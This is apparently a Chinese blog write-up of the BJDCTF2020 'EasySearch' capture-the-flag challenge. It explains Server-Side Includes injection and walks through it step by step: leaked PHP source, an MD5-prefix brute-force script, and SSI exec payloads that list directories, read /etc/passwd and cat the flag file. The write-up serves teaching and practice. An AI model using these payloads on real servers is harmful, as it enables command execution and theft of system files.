---

title: 日常练习26——ssi注入漏洞

date: 2021-04-29 21:58:38

tags: 练习

categories: test75

---
这道题是一道ssi注入题，和ssti注入就差了一个字母，这说明它们两个之间还是有一定联系的。   

# [BJDCTF2020]EasySearch  

打开题目看到一个登录界面。  

[![](https://img.imgdb.cn/item/608fa21cd1a9ae528f702a6b.png)](https://img.imgdb.cn/item/608fa21cd1a9ae528f702a6b.png)  

一般这种登录界面要么是xml外部实体注入，要么是sql注入，先尝试sql注入发现没有用，那么就抓包看一下是不是xml。  

[![](https://img.imgdb.cn/item/608fa2e3d1a9ae528f7a1daa.png)](https://img.imgdb.cn/item/608fa2e3d1a9ae528f7a1daa.png)  

发现也不是xml注入的格式，看了别人的wp发现原来要扫一下源码（这个细节总是会忘...），源码为index.php.swp文件。具体如下：  

	<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
	?>  

可以看出这里需要password经过md5加密后的前六位是6d0bc1  

	$admin = '6d0bc1';
    if ( $admin == substr(md5($_POST['password']),0,6))  

这个可以用脚本破解出来password。  

	import hashlib

	for i in range(1, 100000000):
    res = hashlib.md5(str(i).encode('utf-8')).hexdigest()

    if res[:6] == '6d0bc1':
        print(i, res)

得到密码为：2020666或者2305004，我们使用第一个密码在登陆抓包看一下：  

[![](https://img.imgdb.cn/item/608fa5d2d1a9ae528f9b0e4e.png)](https://img.imgdb.cn/item/608fa5d2d1a9ae528f9b0e4e.png)   

确实登陆上去了，并且还给了我们一个url地址：  

	public/fee23b26535c365d150e4ba8aa4559a7ff651ca4.shtml  

我们进入这个界面看一下：  

[![](https://img.imgdb.cn/item/608fa62fd1a9ae528f9ee32f.png)](https://img.imgdb.cn/item/608fa62fd1a9ae528f9ee32f.png)  

发现回显的就是我们输入的username的值，这里就要考虑是不是ssti注入，我们进行测试，输入username为{ {7*7} }，然后再使用它新给我们  
的url地址来访问：  

[![](https://img.imgdb.cn/item/608fa6a7d1a9ae528fa3f170.png)](https://img.imgdb.cn/item/608fa6a7d1a9ae528fa3f170.png)  

可以看到，虽然回显，但并没和ssti一样回显49或者其他，说明这道题还不是ssti注入，这里就要学习新的知识点ssi注入了。  

## ssi注入  

	SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令（这也就说明了为什么每次我们登录后的shtml网址都会发生变化）。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。  

	SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。

	从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。  

以上就是ssi注入的介绍。当符合下列条件时，攻击者可以在 Web 服务器上运行任意命令：

    Web 服务器已支持SSI（服务器端包含）

    Web 应用程序未对对相关SSI关键字做过滤

    Web 应用程序在返回响应的HTML页面时，嵌入用户输入

这个嵌入用户输入就和ssti一样了，都是返回了我们输入的内容。简单来说就是我们可以通过输入ssi的语法来执行命令，然后执行的结果会被返回到响应的shtml界面上，也就是我们每次登录后返回给我们的新的shtml文件url地址。  

ssi注入语法有很多，这里介绍关于命令执行的语法：  

	<!–#exec cmd="文件名称"–>

	<!--#exec cmd="cat /etc/passwd"-->

	<!–#exec cgi="文件名称"–>

	<!--#exec cgi="/cgi-bin/access_log.cgi"–>  

这道题没有过滤什么字符，我们可以直接使用，如下所示：  

	username=<!--#exec cmd="ls ../"-->&password=2020666  

这里要查看上级目录才能看到flag文件的名字：  

[![](https://img.imgdb.cn/item/608faa90d1a9ae528fd06292.png)](https://img.imgdb.cn/item/608faa90d1a9ae528fd06292.png)  

返回得到了flag文件名字，接下来就是读取该文件：  

	username=<!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"-->&password=2020666  

[![](https://img.imgdb.cn/item/608fab1ad1a9ae528fd57c07.png)](https://img.imgdb.cn/item/608fab1ad1a9ae528fd57c07.png)  

得到flag。  

总结一下，关于ssi注入其实和之前学过的ssti和xxs都有一些相同之处，都是会在网页上返回我们输入的相关字符，而ssi注入是通过动态页面来返回的，也就是shtml网页，我们输入的ssi语句会在服务器被执行然后会被返回到shmtl上一些信息，如果前端对我们输入的ssi敏感字符过滤不严，并且在返回的web页面上有用户输入的的字符，那么就会造成ssi漏洞。  

遇到这类题，要先看一下是否存在动态页面，接着看动态页面是否返回我们输入的字符，接着就是测试字符的过滤，最后使用ssi语法来注入。  

# 小结  

ssi注入是一个新的注入知识，这道题可以说是入门的漏洞讲解，以后会遇到更难的，要对这类注入先做一个简单的认识，打好基础。  

下面是相关学习博客：  

[ssi注入漏洞](https://blog.csdn.net/qq_40657585/article/details/84260844)